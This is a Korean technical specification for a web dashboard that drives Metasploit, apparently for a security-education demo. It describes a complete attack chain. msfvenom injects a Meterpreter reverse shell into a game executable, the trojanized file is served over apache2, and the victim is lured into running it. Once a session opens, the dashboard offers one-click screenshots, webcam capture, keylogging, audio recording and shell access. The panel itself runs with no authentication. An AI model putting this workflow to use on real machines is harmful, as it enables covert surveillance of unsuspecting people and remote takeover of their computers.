# Web C2 Dashboard — 기술 명세서

> 목적: 보안 교육 시연용 웹 기반 Metasploit 제어 패널  
> 최종 수정: 2026-05-07

---

## 1. 네트워크 토폴로지

```
[칼리 리눅스 노트북]          [휴대폰 LTE 핫스팟]          [피해자 노트북]
 LHOST (자동감지) ──────────  (Bridge Router)  ──────────── victim IP
      │
  ┌───┴──────────────────┐
  │ msfrpcd  127.0.0.1:55553 │
  │ Flask    0.0.0.0:5000    │  ← 모든 IP 접근 허용 (인증 없음)
  │ apache2  0.0.0.0:80      │  ← 페이로드 배포용
  └──────────────────────┘
```

**전제 조건:**
- 칼리와 피해자 노트북 모두 동일한 LTE 핫스팟에 연결 (브릿지 어댑터)
- 핫스팟 AP Isolation 비활성화 (클라이언트 간 통신 허용)
- msfrpcd는 루프백(127.0.0.1)에만 바인딩 — 외부 직접 노출 없음
- 평문 HTTP/WebSocket 사용 — Wireshark로 트래픽 가시화 가능

---

## 2. 기술 스택

| 레이어 | 기술 |
|--------|------|
| 프론트엔드 | HTML5 / Vanilla JS / Tailwind CSS CDN / socket.io CDN |
| 실시간 통신 | WebSocket (Flask-SocketIO + eventlet) |
| 백엔드 | Python Flask + Flask-SocketIO |
| MSF 연동 | pymetasploit3 |
| RPC 서버 | Metasploit msfrpcd (Kali 내장) |
| 페이로드 생성 | msfvenom (서버 사이드 subprocess) |

---

## 3. 디렉터리 구조

```
metasploit-lab/
├── backend/
│   ├── app.py              # Flask 진입점, 모든 REST + WebSocket 핸들러
│   ├── config.py           # LHOST 자동 감지, 환경 변수
│   ├── msf_client.py       # MSF-RPC 싱글턴 래퍼 (pymetasploit3)
│   └── requirements.txt
├── frontend/
│   ├── dashboard.html      # 대시보드 단일 페이지
│   └── static/
│       └── app.js          # WebSocket 클라이언트, UI 로직
├── payload/
│   ├── ms.sh               # msfconsole 리스너 원클릭 실행
│   ├── inject.sh           # (수동용) msfvenom 셸코드 주입 스크립트
│   └── game_template.py    # (수동용) pygame 게임 템플릿
├── README.md
└── SPEC.md
```

---

## 4. 설정 (`config.py`)

| 변수 | 기본값 | 설명 |
|------|--------|------|
| `MSF_HOST` | `127.0.0.1` | msfrpcd 주소 |
| `MSF_PORT` | `55553` | msfrpcd 포트 |
| `MSF_PASSWORD` | `msfrpc` | msfrpcd 인증 패스워드 |
| `LHOST` | **자동 감지** | 환경변수 미설정 시 라우팅 테이블로 현재 IP 감지 |
| `LPORT` | `4444` | Meterpreter reverse 포트 |
| `UPLOAD_DIR` | `/tmp/demo_uploads` | 업로드 파일 임시 저장 경로 |

**LHOST 자동 감지 방식:** 실제 패킷을 보내지 않고 소켓의 라우팅 테이블을 참조하여 현재 아웃바운드 IP를 반환. 인터넷 불필요.

```bash
# IP를 고정하고 싶을 때만 환경변수 사용
LHOST=172.20.10.12 python app.py
```

---

## 5. MSF-RPC 서버

```bash
msfrpcd -P [PASSWORD] -n -f -a 127.0.0.1 -p 55553
```

| 옵션 | 설명 |
|------|------|
| `-P` | 인증 패스워드 (`config.py`의 `MSF_PASSWORD`와 일치해야 함) |
| `-n` | SSL 없이 실행 |
| `-f` | 포그라운드 실행 |
| `-a 127.0.0.1` | 루프백만 바인딩 |

---

## 6. REST API

| Method | Path | 설명 |
|--------|------|------|
| `GET` | `/` | dashboard.html 반환 |
| `GET` | `/api/status` | MSF-RPC 연결 상태, LHOST/LPORT |
| `GET` | `/api/sessions` | 활성 세션 목록 |
| `POST` | `/api/upload/image` | 이미지 업로드 (jpg/png/gif, 10MB) → `{file_path}` |
| `POST` | `/api/upload/audio` | 오디오 업로드 (wav/mp3, 10MB) → `{file_path}` |
| `POST` | `/api/payload/upload` | 템플릿 exe 업로드 → `{template_path}` |
| `GET` | `/api/payload/download/<filename>` | 주입 완료 exe 다운로드 |

---

## 7. WebSocket 이벤트

### 클라이언트 → 서버

| 이벤트 | Payload | 설명 |
|--------|---------|------|
| `run_command` | `{session_id, command}` | Meterpreter 명령 직접 전송 |
| `kill_all` | `{}` | 전체 세션 강제 종료 |
| `kill_port` | `{}` | 칼리 로컬에서 `fuser -k -n tcp LPORT` 실행 |
| `request_sessions` | `{}` | 세션 목록 즉시 갱신 요청 |
| `inject_payload` | `{template_path}` | msfvenom 백그라운드 주입 시작 |

### 서버 → 클라이언트

| 이벤트 | Payload | 설명 |
|--------|---------|------|
| `session_update` | `{sessions: [...]}` | 세션 목록 변경 시 자동 push |
| `cmd_result` | `{success, command, output, timestamp}` | 명령 실행 결과 |
| `image_data` | `{command, data: "data:image/...;base64,..."}` | screenshot/webcam_snap 이미지 |
| `system_event` | `{level: info/warn/error, message}` | 시스템 알림 |
| `injection_progress` | `{message}` | msfvenom 진행 상태 |
| `injection_complete` | `{filename, download_url, lhost, lport}` | 주입 완료 |
| `injection_error` | `{message}` | 주입 실패 |

**자동 push 타이밍:**
- 세션 모니터: 3초 폴링 → 변화 있을 때만 `session_update` 브로드캐스트
- 토큰 갱신: 240초마다 msfrpcd 재인증 (토큰 만료 5분 전)

---

## 8. 프론트엔드

### 레이아웃

```
┌─────────────────────────────────────────────────────────┐
│  🛑 KILL ALL  🔌 PORT KILL   LHOST x.x.x.x:4444  ●    │  ← Header
├─────────────────────────────────────────────────────────┤
│  ACTIVE SESSIONS                           [↻ 갱신]    │
│  ┌──────────────────────────────────────────────────┐   │
│  │ #1  192.168.x.B  win  meterpreter               │   │  ← 세션 카드
│  └──────────────────────────────────────────────────┘   │
├─────────────────────────────────────────────────────────┤
│  [명령]  [⚡ 페이로드]              선택: #1           │  ← 탭
│                                                         │
│  빠른입력: [sysinfo] [screenshot] [webcam_snap] ...    │
│                                                         │
│  meterpreter > [__________________________] [▶ 실행]   │
│                                                         │
│  ┌──────────────────────────────────────────────────┐   │
│  │ // 명령 출력                                      │   │  ← 출력창
│  └──────────────────────────────────────────────────┘   │
│  [이미지 프리뷰 — screenshot/webcam_snap 시 자동 표시]  │
└─────────────────────────────────────────────────────────┘
                                    │ EVENT LOG           │
                                    │ [시간] 메시지...    │
                                    └─────────────────────┘
```

### 명령 탭 기능

| 기능 | 동작 |
|------|------|
| 빠른 입력 버튼 | 클릭 시 입력창에 명령어 자동 채움 |
| Enter / ▶ 실행 | `run_command` 이벤트 emit |
| ↑↓ 방향키 | 명령 히스토리 탐색 |
| screenshot / webcam_snap | 결과를 이미지로 자동 표시 |
| 그 외 모든 명령 | 출력 텍스트로 표시 |

**빠른 입력 목록:** `sysinfo`, `screenshot`, `webcam_snap -i 1`, `webcam_stream -i 1`, `screenshare`, `keyscan_start`, `keyscan_dump`, `keyscan_stop`, `run post/multi/gather/sound_recorder DURATION=5`, `ps`, `shell`

### 페이로드 탭 기능

| 단계 | 설명 |
|------|------|
| ① 파일 선택 | 오목.exe 업로드 → `/api/payload/upload` → `template_path` 수신 |
| ② 셸코드 주입 | `inject_payload` 이벤트 emit → 백엔드에서 `msfvenom -x -k` 실행 (30~60초) |
| ③ 다운로드 | 완료 후 `omok_patched.exe` 다운로드 버튼 표시 |

msfvenom 실행은 `eventlet.tpool.execute()`로 실제 OS 스레드에서 분리 — 이벤트 루프 블로킹 없음.

---

## 9. 페이로드 배포 흐름

```
[칼리] 오목.exe 준비
       ↓
[대시보드] 페이로드 탭 → 오목.exe 업로드 → 주입 → omok_patched.exe 다운로드
       ↓
[칼리] cp omok_patched.exe /var/www/html/omok.exe
       systemctl start apache2
       ↓
[칼리] ./payload/ms.sh   (msfconsole 리스너 자동 실행)
       ↓
[피해자] http://LHOST/omok.exe 다운로드 후 실행
       ↓
[대시보드] 세션 카드 자동 표시 → 명령 탭에서 제어
```

---

## 10. 시연 전/후 체크리스트

### 시연 전

- [ ] 칼리 핫스팟 연결 확인 (`ip addr` 로 LHOST 확인)
- [ ] `msfrpcd -P msfrpc -n -f -a 127.0.0.1 -p 55553` 실행
- [ ] `cd backend && python app.py` 로 대시보드 실행
- [ ] 브라우저에서 `http://LHOST:5000` 접속, Online 표시 확인
- [ ] 페이로드 탭에서 오목.exe 업로드 → 주입 → 다운로드
- [ ] `cp omok_patched.exe /var/www/html/omok.exe && systemctl start apache2`
- [ ] `./payload/ms.sh` 실행 (리스너 대기)
- [ ] 피해자 노트북에서 `http://LHOST/omok.exe` 실행
- [ ] 대시보드에 세션 카드 표시 확인

### 시연 후

- [ ] 🛑 KILL ALL 버튼으로 전체 세션 종료
- [ ] 피해자 노트북 원상복구 (재부팅 또는 스냅샷 복원)
- [ ] `rm -rf /tmp/demo_uploads/*` 임시 파일 삭제
- [ ] `systemctl stop apache2`
- [ ] msfrpcd 프로세스 종료
